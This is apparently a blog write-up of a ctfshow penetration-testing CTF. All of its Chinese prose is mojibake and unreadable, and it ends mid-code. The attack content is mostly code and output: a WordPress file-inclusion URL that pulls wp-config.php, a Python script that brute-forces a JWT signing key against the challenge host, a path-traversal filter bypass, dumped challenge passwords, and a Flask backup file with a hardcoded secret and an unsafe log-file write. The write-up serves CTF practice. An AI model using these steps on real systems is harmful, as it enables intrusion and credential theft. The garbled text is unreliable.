punctuation">,</span>        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"object"</span><span class="token punctuation">,</span>        <span class="token property">"required"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token string">"username"</span><span class="token punctuation">,</span>          <span class="token string">"password"</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Body_login_login_post"</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token property">"HTTPValidationError"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"properties"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"detail"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"items"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"#/components/schemas/ValidationError"</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"array"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Detail"</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"object"</span><span class="token punctuation">,</span>        <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"HTTPValidationError"</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token property">"Token"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"properties"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"access_token"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Access Token"</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"token_type"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Token Type"</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"object"</span><span class="token punctuation">,</span>        <span class="token property">"required"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token string">"access_token"</span><span class="token punctuation">,</span>          <span class="token string">"token_type"</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Token"</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token property">"ValidationError"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"properties"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"loc"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"items"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"anyOf"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token punctuation">&#123;</span>                  <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token punctuation">&#123;</span>                  <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"integer"</span>                <span class="token punctuation">&#125;</span>              <span class="token punctuation">]</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"array"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Location"</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"msg"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Message"</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"type"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Error Type"</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"object"</span><span class="token punctuation">,</span>        <span class="token property">"required"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token string">"loc"</span><span class="token punctuation">,</span>          <span class="token string">"msg"</span><span class="token punctuation">,</span>          <span class="token string">"type"</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"ValidationError"</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"securitySchemes"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"oauth2"</span><span class="token punctuation">,</span>        <span class="token property">"flows"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"password"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"scopes"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"tokenUrl"</span><span class="token operator">:</span> <span class="token string">"login"</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è·¯ç”±"><a href="#è·¯ç”±" class="headerlink" title="è·¯ç”±"></a>è·¯ç”±</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">[</span>    <span class="token string">"/login"</span><span class="token punctuation">,</span>    <span class="token string">"/"</span><span class="token punctuation">,</span>    <span class="token string">"/task_newest"</span><span class="token punctuation">,</span>    <span class="token string">"/task_completed"</span><span class="token punctuation">,</span>    <span class="token string">"/task_cancelled"</span><span class="token punctuation">,</span>    <span class="token string">"/message_inbox"</span><span class="token punctuation">,</span>    <span class="token string">"/message_sent"</span><span class="token punctuation">,</span>    <span class="token string">"/messageBox"</span><span class="token punctuation">,</span>    <span class="token string">"/listTaskFiles"</span><span class="token punctuation">,</span>    <span class="token string">"/readTaskFile"</span><span class="token punctuation">,</span>    <span class="token string">"/downloadTaskFile"</span><span class="token punctuation">,</span>    <span class="token string">"/getPhone"</span><span class="token punctuation">,</span>    <span class="token string">"/getServerInfo"</span><span class="token punctuation">,</span>    <span class="token string">"/checkServer"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åçŒœæµ‹å¾—å»å‰é¢æåˆ°çš„æŸåŠ¨ä¿ç«™å®é™…æ‰“ç‚¹ä¸€ä¸‹äº†ï¼Œæ˜¯ä¸ªwordpress</p><p>ç›´æ¥wpscanæ‰«ä¸€ä¸‹ï¼š</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250101173857446.png" alt="image-20250101173857446"></p><p>å‘ç°æœ‰ä¸ªæ–‡ä»¶åŒ…å«ï¼Œçœ‹ä¸‹pocï¼š<a href="https://wpscan.com/vulnerability/dfe62ff5-956c-4403-b3fd-55677628036b/">https://wpscan.com/vulnerability/dfe62ff5-956c-4403-b3fd-55677628036b/</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//example.com/?aam-media=wp-config.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸‹è½½ wp-config.php å¾—åˆ°æ•°æ®åº“è´¦å¯†</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250101174014694.png" alt="image-20250101174014694"></p><p>flagï¼š<code>ctfshow&#123;hsinchug_wp1_Q.4Vyj8VCiedX1KYU5g05&#125;</code></p><hr><h1 id="ç¬¬äºŒç« ï¼ˆFastapiï¼‰"><a href="#ç¬¬äºŒç« ï¼ˆFastapiï¼‰" class="headerlink" title="ç¬¬äºŒç« ï¼ˆFastapiï¼‰"></a>ç¬¬äºŒç« ï¼ˆFastapiï¼‰</h1><h2 id="ç§˜å¯†æ½œä¼"><a href="#ç§˜å¯†æ½œä¼" class="headerlink" title="ç§˜å¯†æ½œä¼"></a>ç§˜å¯†æ½œä¼</h2><p>è´¦å¯† <code>hsinchug_wp1:Q.4Vyj8VCiedX1KYU5g05</code></p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250101174252508.png" alt="image-20250101174252508"></p><p>å‘ç°key</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250101174645000.png" alt="image-20250101174645000"></p><p>keyï¼š<code>4a4f7d6e8b5??Dc7f</code></p><p>æ€»ä¹‹å…ˆæŠŠä¹‹å‰ fastapi çš„æ¯ä¸ªæ¥å£éƒ½æµ‹ä¸€éï¼š</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250101180655730.png" alt="image-20250101180655730"></p><p>ä»¥ä¸‹è·¯ç”±éœ€è¦é«˜æƒé™</p><pre><code>/listTaskFiles/readTaskFile/downloadTaskFile</code></pre><p>ç°åœ¨å‡†å¤‡å†™è„šæœ¬çˆ†ç ´ jwt</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string<span class="token keyword">import</span> jwt<span class="token keyword">import</span> itertools<span class="token keyword">import</span> requests<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># å®šä¹‰ Payload æ•°æ®</span>payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"sub"</span><span class="token punctuation">:</span> <span class="token string">"dylan"</span><span class="token punctuation">,</span>    <span class="token string">"exp"</span><span class="token punctuation">:</span> <span class="token number">1735985106</span><span class="token punctuation">&#125;</span><span class="token comment"># ç”Ÿæˆæ‰€æœ‰å¯èƒ½çš„æ›¿æ¢å­—ç¬¦</span>possible_chars <span class="token operator">=</span> <span class="token string">"0123456789abcdef"</span>combinations <span class="token operator">=</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span>possible_chars<span class="token punctuation">,</span> repeat<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment"># éå†æ‰€æœ‰å¯èƒ½çš„æ›¿æ¢å­—ç¬¦ç»„åˆ</span><span class="token keyword">for</span> i <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span>combinations<span class="token punctuation">)</span><span class="token punctuation">:</span>    chars <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    modified_key <span class="token operator">=</span> <span class="token string">"4a4f7d6e8b5"</span> <span class="token operator">+</span> chars <span class="token operator">+</span> <span class="token string">"0c7f"</span>    <span class="token comment"># print(modified_key)</span>    <span class="token comment"># # ç”Ÿæˆ JWT</span>    token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token punctuation">(</span>modified_key<span class="token punctuation">)</span><span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">'HS256'</span><span class="token punctuation">)</span>    <span class="token comment"># print(token)</span>    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'Authorization'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'Bearer </span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">&#125;</span>    <span class="token comment"># å‘é€ HTTP è¯·æ±‚</span>    url <span class="token operator">=</span> <span class="token string">'http://94e3c5a5-9608-4bf6-bc9a-519026a4f79c.challenge.ctf.show/'</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>modified_key<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çˆ†å‡ºkeyï¼š<code>4a4f7d6e8b5e3a0c7f</code></p><p>tokenï¼š<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkeWxhbiIsImV4cCI6MTczNTk4NTEwNn0.7lqthRIUXMlHFLv8J25BF2qzoMn6EbXaJHeLLKuy6VI</code></p><p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkeWxhbiIsImV4cCI6MTczNjA4NTIwOH0.qCHIJugF1Q4TQexDG_vydZbJhUPz9WWXs4_ikK9pagI</p><p>è®¿é—® &#x2F;getPhone æ¥å£æ‹¿åˆ° dylan çš„ç”µè¯å·ç </p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250103181859746.png" alt="image-20250103181859746"></p><p>flagï¼š<code>ctfshow&#123;117447685307&#125;</code></p><hr><h2 id="æ”¶é›†æ•Œæ–¹èº«ä»½ä¿¡æ¯"><a href="#æ”¶é›†æ•Œæ–¹èº«ä»½ä¿¡æ¯" class="headerlink" title="æ”¶é›†æ•Œæ–¹èº«ä»½ä¿¡æ¯"></a>æ”¶é›†æ•Œæ–¹èº«ä»½ä¿¡æ¯</h2><p>ä»¥ dylan èº«ä»½è¿‡ä¸€éæ¥å£</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250103182341919.png" alt="image-20250103182341919"></p><p>é‚£ä¹ˆ dylan çš„è´¦å¯†ä¸º<code>dylan:8f7a55c6d9a7d9a7</code></p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250103182223469.png" alt="image-20250103182223469"></p><h3 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a>æ–‡ä»¶è¯»å–</h3><p>ä½¿ç”¨ <code>/listTaskFiles?path</code>éå†ç›®å½•ï¼Œå‘ç°ä¸èƒ½ç›®å½•ç©¿è¶Šï¼Œæµ‹äº†ä¸€ä¸‹æŠŠ <code>/</code> å’Œ <code>\</code> banäº†ï¼Œä½†æ˜¯<code>..</code>èƒ½ç”¨</p><p>ä½¿ç”¨ <code>/readTaskFile?path=&amp;file_name=</code> è¯»å–æ–‡ä»¶ï¼ŒåŒæ ·æœ‰ä¸Šé¢çš„wafï¼Œè€Œä¸”è¿˜banäº†app.py</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250103182732770.png" alt="image-20250103182732770"></p><h3 id="init-users-json"><a href="#init-users-json" class="headerlink" title="init_users.json"></a>init_users.json</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"hsinchug_wp1"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"username"</span><span class="token operator">:</span> <span class="token string">"hsinchug_wp1"</span><span class="token punctuation">,</span>        <span class="token property">"password"</span><span class="token operator">:</span> <span class="token string">"Q.4Vyj8VCiedX1KYU5g05"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"dylan"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"username"</span><span class="token operator">:</span> <span class="token string">"dylan"</span><span class="token punctuation">,</span>        <span class="token property">"password"</span><span class="token operator">:</span> <span class="token string">"8f7a55c6d9a7d9a7"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"secret_user"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"username"</span><span class="token operator">:</span> <span class="token string">"root"</span><span class="token punctuation">,</span>        <span class="token property">"password"</span><span class="token operator">:</span> <span class="token string">"7y.(sc#Ac_"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flagï¼š<code>ctfshow&#123;7y.(sc#Ac_&#125;</code></p><h3 id="main-py-bak"><a href="#main-py-bak" class="headerlink" title="main.py.bak"></a>main.py.bak</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token punctuation">,</span> session<span class="token keyword">from</span> flask <span class="token keyword">import</span> url_for<span class="token keyword">from</span> flask <span class="token keyword">import</span> redirect<span class="token keyword">import</span> logging<span class="token keyword">from</span> os<span class="token punctuation">.</span>path <span class="token keyword">import</span> basename<span class="token keyword">from</span> os<span class="token punctuation">.</span>path <span class="token keyword">import</span> joinapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5'</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'guest'</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'log server is running'</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">check_session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'user'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/key'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> check_session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"not authorized"</span><span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/log_server_key.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            key <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'key'</span><span class="token punctuation">,</span> <span class="token string">'key'</span><span class="token punctuation">:</span> key<span class="token punctuation">&#125;</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/set_log_option'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">set_log_option</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> check_session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"not authorized"</span><span class="token punctuation">&#125;</span>    logName <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'logName'</span><span class="token punctuation">)</span>    logFile <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'logFile'</span><span class="token punctuation">)</span>    app_log <span class="token operator">=</span> logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span>logName<span class="token punctuation">)</span>    app_log<span class="token punctuation">.</span>addHandler<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>FileHandler<span class="token punctuation">(</span><span class="token string">'./log/'</span> <span class="token operator">+</span> logFile<span class="token punctuation">)</span><span class="token punctuation">)</span>    app_log<span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">)</span>    clear_log_file<span class="token punctuation">(</span><span class="token string">'./log/'</span> <span class="token operator">+</span> logFile<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'log option set successfully'</span><span class="token punctuation">&#125;</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/get_log_content'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_log_content</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> check_session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"not authorized"</span><span class="token punctuation">&#125;</span>    logFile <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'logFile'</span><span class="token punctuation">)</span>    path <span class="token operator">=</span> join<span class="token punctuation">(</span><span class="token string">'log'</span><span class="token punctuation">,</span> basename<span class="token punctuation">(</span>logFile<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'log content'</span><span class="token punctuation">,</span> <span class="token string">'content'</span><span class="token punctuation">:</span> content<span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">clear_log_file</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span 